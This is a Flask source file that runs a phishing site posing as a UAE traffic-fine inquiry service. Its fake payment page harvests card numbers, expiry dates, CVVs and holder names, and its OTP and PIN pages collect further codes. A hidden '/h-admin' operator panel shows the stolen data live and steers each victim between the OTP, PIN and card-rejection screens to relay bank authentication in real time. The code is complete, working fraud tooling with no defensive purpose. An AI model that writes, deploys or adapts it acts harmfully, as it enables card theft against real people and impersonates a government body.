import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# مخزن البيانات في ذاكرة السيرفر
db = {"sessions": {}, "status": "waiting", "msg": ""}

# --- 1. الهيدر الرسمي الفخم الموحد ---
MOI_TOP_BAR = '''
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
    body { margin:0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#f7f8fa; color:#333; direction: rtl; }
    .header-top { background: white; border-bottom: 1px solid #eee; padding: 15px 40px; display: flex; justify-content: space-between; align-items: center; }
    .header-tools { display: flex; align-items: center; gap: 30px; color: #555; font-size: 19px; font-weight: bold; }
    .menu-gold { background: #b0914f; color: white; padding: 12px 22px; border-radius: 8px; cursor: pointer; font-size: 22px; }
    .logo-area { background: white; text-align: center; padding: 25px 0; border-bottom: 5px solid #b0914f; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
    .logo-area img { width: 95%; max-width: 800px; }
</style>
<div class="header-top">
    <div class="header-tools">
        <span style="color:#b0914f; cursor:pointer;">EN | دخول</span>
        <i class="fa fa-info-circle"></i><i class="fa fa-volume-up"></i><i class="fa fa-search"></i>
    </div>
    <div class="menu-gold"><i class="fa fa-bars"></i></div>
</div>
<div class="logo-area">
    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg">
</div>
'''

# --- 2. الصفحة الرئيسية (الشبكة الكاملة 9 صور + البانر) ---
@app.route('/')
def index():
    html = MOI_TOP_BAR + '''
    <style>
        .hero-banner { max-width: 1100px; margin: 0 auto; overflow: hidden; }
        .hero-banner img { width: 100%; display: block; }
        .services-grid { 
            display: grid; 
            grid-template-columns: repeat(3, 1fr); 
            gap: 20px; 
            max-width: 1000px; 
            margin: 40px auto; 
            padding: 0 20px;
        }
        .service-item { 
            background: white; 
            border-radius: 20px; 
            overflow: hidden; 
            box-shadow: 0 6px 20px rgba(0,0,0,0.06);
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 1px solid #eee;
        }
        .service-item:hover { transform: translateY(-10px); box-shadow: 0 15px 35px rgba(176,145,79,0.2); border-color: #b0914f; }
        .service-item img { width: 100%; height: auto; display: block; }
        .main-btn-area { text-align: center; padding: 50px 20px; }
        .btn-gold-big { background: #b0914f; color: white; padding: 25px 80px; border: none; border-radius: 15px; font-size: 28px; font-weight: bold; cursor: pointer; box-shadow: 0 10px 25px rgba(176,145,79,0.4); }
    </style>
    <div class="hero-banner">
        <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
    </div>
    
    <div class="services-grid">
        <div class="service-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg"></div>
        <div class="service-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg"></div>
        <div class="service-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg"></div>
        <div class="service-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg"></div>
        <div class="service-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg"></div>
        <div class="service-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg"></div>
        <div class="service-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg"></div>
        <div class="service-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg"></div>
        <div class="service-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg"></div>
    </div>
    
    <div class="main-btn-area">
        <button onclick="location.href='/search'" class="btn-gold-big">ابدأ الخدمة الآن</button>
    </div>
    '''
    return render_template_string(html)

# --- 3. صفحة الاستعلام (النسخة الكاملة بالتبويبات) ---
@app.route('/search')
def search():
    html = MOI_TOP_BAR + '''
    <style>
        .card-wrap{background:white; width:92%; max-width:900px; margin:50px auto; border-top:12px solid #b0914f; padding:60px; box-shadow:0 20px 50px rgba(0,0,0,0.1); border-radius:0 0 25px 25px;}
        .tabs{display:flex; gap:15px; margin-bottom:45px; border-bottom:2px solid #eee; padding-bottom:25px;}
        .t-btn{flex:1; padding:22px; border:1px solid #ddd; background:#f9f9f9; cursor:pointer; font-weight:bold; font-size:20px; border-radius:12px; text-align:center; color:#666;}
        .t-btn.active{background:#b0914f; color:white; border-color:#b0914f; box-shadow:0 8px 20px rgba(176,145,79,0.3);}
        .input-group{display:none;} .input-group.active{display:block;}
        label{display:block; margin:25px 0 12px; font-weight:bold; font-size:21px; color:#444;}
        input, select{width:100%; padding:25px; border:2px solid #eee; border-radius:15px; font-size:21px; outline:none; background:#fafafa; box-sizing:border-box;}
        input:focus{border-color:#b0914f; background:#fff;}
        .go-btn{width:100%; padding:30px; background:#b0914f; color:white; border:none; font-size:28px; font-weight:bold; cursor:pointer; border-radius:15px; margin-top:40px;}
    </style>
    <div class="card-wrap">
        <h1 style="text-align:center; font-size:36px; margin-bottom:50px;">الاستعلام عن المخالفات المرورية</h1>
        <div class="tabs">
            <div class="t-btn active" onclick="showT(event,'p')">بيانات اللوحة</div>
            <div class="t-btn" onclick="showT(event,'t')">الرمز المروري</div>
            <div class="t-btn" onclick="showT(event,'l')">بيانات الرخصة</div>
        </div>
        <div id="p" class="input-group active">
            <label>الإمارة</label>
            <select><option>أبوظبي</option><option>دبي</option><option>الشارقة</option><option>عجمان</option><option>أم القيوين</option><option>رأس الخيمة</option><option>الفجيرة</option></select>
            <div style="display:grid; grid-template-columns:1fr 1fr; gap:25px;">
                <div><label>المصدر</label><select><option>خصوصي</option><option>تجاري</option></select></div>
                <div><label>الفئة</label><input placeholder="1"></div>
            </div>
            <label>رقم اللوحة</label><input placeholder="12345">
        </div>
        <div id="t" class="input-group"><label>الرمز المروري (T.C)</label><input placeholder="8 أرقام"></div>
        <div id="l" class="input-group"><label>رقم الرخصة</label><input placeholder="رقم الرخصة"></div>
        <button onclick="location.href='/checkout'" class="go-btn">استعلام</button>
    </div>
    <script>
        function showT(e,id){
            let g=document.getElementsByClassName("input-group"); for(let i=0;i<g.length;i++)g[i].classList.remove("active");
            let b=document.getElementsByClassName("t-btn"); for(let i=0;i<b.length;i++)b[i].classList.remove("active");
            document.getElementById(id).classList.add("active"); e.currentTarget.classList.add("active");
        }
    </script>
    '''
    return render_template_string(html)

# --- 4. صفحة الدفع (النسخة العملاقة والذكية) ---
@app.route('/checkout')
def checkout():
    html = MOI_TOP_BAR + '''
    <style>
        .p-box{max-width:850px; margin:50px auto; background:white; border-radius:25px; box-shadow:0 20px 60px rgba(0,0,0,0.1); padding:70px;}
        .p-head{background:#b0914f; color:white; padding:35px; border-radius:20px 20px 0 0; text-align:center; margin:-70px -70px 50px -70px; font-size:30px; font-weight:bold;}
        input, select{width:100%; padding:26px; margin-bottom:30px; border:2px solid #eee; border-radius:15px; font-size:22px; outline:none; box-sizing:border-box;}
        .p-btn{width:100%; padding:30px; background:#b0914f; color:white; border:none; border-radius:15px; font-size:28px; font-weight:bold; cursor:pointer;}
        .logos img{height:55px; opacity:0.2; margin:0 20px; transition:0.4s;}
        .active-l{opacity:1 !important; transform:scale(1.25);}
    </style>
    <div class="p-box">
        <div class="p-head">بوابة الدفع الآمنة الموحدة - 2026</div>
        <div style="text-align:center; margin-bottom:45px;">
            <img id="v" class="logos" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png">
            <img id="m" class="logos" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png">
        </div>
        <form action="/submit-card" method="POST">
            <input name="card" id="cn" placeholder="رقم البطاقة" maxlength="19" required>
            <div style="display:flex; gap:25px;">
                <select name="em" required><option value="">الشهر</option>{% for m in range(1,13) %}<option>{{ "%02d"|format(m) }}</option>{% endfor %}</select>
                <select name="ey" required><option value="">السنة</option>{% for y in range(2026,2037) %}<option>{{ y }}</option>{% endfor %}</select>
            </div>
            <div style="display:flex; gap:25px;">
                <input name="cvv" placeholder="CVV" maxlength="3" style="flex:1;" required>
                <input name="holder" placeholder="اسم صاحب البطاقة" style="flex:3;" required>
            </div>
            <button type="submit" class="p-btn">دفع الرسوم المستحقة</button>
        </form>
    </div>
    <script>
        document.getElementById('cn').addEventListener('input', e => {
            let v = e.target.value.replace(/\\s/g, '');
            document.getElementById('v').className = v.startsWith('4') ? 'active-l' : 'logos';
            document.getElementById('m').className = v.startsWith('5') ? 'active-l' : 'logos';
            e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
        });
    </script>
    '''
    return render_template_string(html)

# --- 5. صفحات الـ OTP والـ PIN والتحكم VIP (كل سطر موجود) ---
@app.route('/otp')
def otp():
    return render_template_string(MOI_TOP_BAR + '''
    <div style="display:flex; justify-content:center; align-items:center; min-height:70vh;">
        <div style="background:white; width:90%; max-width:750px; padding:100px; border-radius:35px; text-align:center; border-top:12px solid #b0914f; box-shadow:0 30px 70px rgba(0,0,0,0.15);">
            <h1 style="font-size:42px;">رمز التحقق (OTP)</h1>
            <p style="font-size:24px; color:#777; margin-bottom:50px;">أدخل الرمز المكون من 6 أرقام</p>
            <form action="/submit-card" method="POST">
                <input name="otp" maxlength="6" style="width:100%; padding:40px; font-size:70px; text-align:center; border:3px solid #eee; border-radius:25px; margin-bottom:50px; letter-spacing:20px; font-weight:bold; outline:none;">
                <button style="width:100%; padding:35px; background:#b0914f; color:white; border:none; border-radius:20px; font-size:32px; font-weight:bold; cursor:pointer;">تأكيد السداد</button>
            </form>
        </div>
    </div>''')

@app.route('/pin')
def pin():
    return render_template_string(MOI_TOP_BAR + '''
    <div style="display:flex; justify-content:center; align-items:center; min-height:70vh;">
        <div style="background:white; width:90%; max-width:750px; padding:100px; border-radius:35px; text-align:center; border-top:12px solid #b0914f; box-shadow:0 30px 70px rgba(0,0,0,0.15);">
            <h1 style="font-size:42px;">الرقم السري (PIN)</h1>
            <p style="font-size:24px; color:#777; margin-bottom:50px;">يرجى إدخال رقم PIN المكون من 4 أرقام</p>
            <form action="/submit-card" method="POST">
                <input name="pin" type="password" maxlength="4" style="width:100%; padding:40px; font-size:70px; text-align:center; border:3px solid #eee; border-radius:25px; margin-bottom:50px; letter-spacing:20px; font-weight:bold; outline:none;">
                <button style="width:100%; padding:35px; background:#b0914f; color:white; border:none; border-radius:20px; font-size:32px; font-weight:bold; cursor:pointer;">إرسال</button>
            </form>
        </div>
    </div>''')

@app.route('/h-admin')
def admin():
    return render_template_string('''
    <html lang="ar" dir="rtl"><head><style>
        body{background:#0a0a0a; color:#fff; font-family:sans-serif; padding:50px;}
        .card { background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); width:480px; height:280px; border-radius:30px; padding:35px; position:relative; margin:25px; display:inline-block; vertical-align:top; box-shadow:0 15px 40px rgba(0,0,0,0.5); }
        .num { font-size:35px; letter-spacing:5px; margin-top:90px; text-shadow:2px 2px 4px #000; }
        .box { background:#1a1a1a; padding:25px; border-radius:0 0 30px 30px; width:510px; margin-left:25px; margin-top:-35px; border:1px solid #333; }
        .btn { padding:20px; border:none; border-radius:15px; cursor:pointer; font-weight:bold; width:48%; margin:1%; font-size:18px; color:white; }
    </style></head>
    <body>
        <h1 style="font-size:40px;">لوحة تحكم الصياد VIP 👮‍♂️</h1>
        <div id="logs"></div>
        <script>
            function refresh(){
                fetch('/get-logs').then(r=>r.json()).then(data=>{
                    let h = '';
                    for(let id in data.sessions){
                        let s = data.sessions[id];
                        h += `<div>
                            <div class="card">
                                <div style="position:absolute; top:35px; right:35px; font-size:22px;">CVV: ${s.cvv}</div>
                                <div class="num">${s.card}</div>
                                <div style="margin-top:45px; font-size:24px;">${s.holder}</div>
                                <div style="position:absolute; bottom:35px; right:35px; font-size:22px;">${s.em}/${s.ey}</div>
                            </div>
                            <div class="box">
                                <div style="color:#0f0; font-size:28px; text-align:center; margin-bottom:20px; font-weight:bold;">
                                    OTP: ${s.otp || '---'} | PIN: ${s.pin || '---'}
                                </div>
                                <button class="btn" style="background:#27ae60;" onclick="act('go_otp')">طلب OTP</button>
                                <button class="btn" style="background:#2980b9;" onclick="act('go_pin')">طلب PIN</button>
                                <button class="btn" style="background:#c0392b; width:98%; margin-top:15px;" onclick="act('error_card','البيانات مرفوضة')">رفض البطاقة</button>
                            </div>
                        </div>`;
                    }
                    document.getElementById('logs').innerHTML = h;
                });
            }
            function act(st, m=''){ fetch('/set-status/'+st+'?msg='+m); }
            setInterval(refresh, 2000); refresh();
        </script>
    </body></html>''')

# --- 6. الباكيند (المحرك الرئيسي) ---
@app.route('/submit-card', methods=['POST'])
def sub():
    c = request.form.get('card') or "CARD"
    if c not in db['sessions']: db['sessions'][c] = request.form.to_dict()
    else: db['sessions'][c].update(request.form.to_dict())
    db['status'] = 'waiting'
    return render_template_string('''<script>setInterval(()=>{fetch("/check-status").then(r=>r.json()).then(d=>{if(d.status==="go_otp")location.href="/otp";if(d.status==="go_pin")location.href="/pin";if(d.status==="error_card"){alert(d.msg);location.href="/checkout";}});},2000);</script><body style="text-align:center;padding-top:200px;font-family:sans-serif;background:#f8f9fa;"><h2>جاري التحقق من البيانات بأمان...</h2></body>''')

@app.route('/get-logs')
def get_logs(): return jsonify({"sessions": db['sessions']})

@app.route('/set-status/<s>')
def set_s(s): db['status'] = s; db['msg'] = request.args.get('msg', ''); return "OK"

@app.route('/check-status')
def check_s(): return jsonify({"status": db['status'], "msg": db['msg']})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
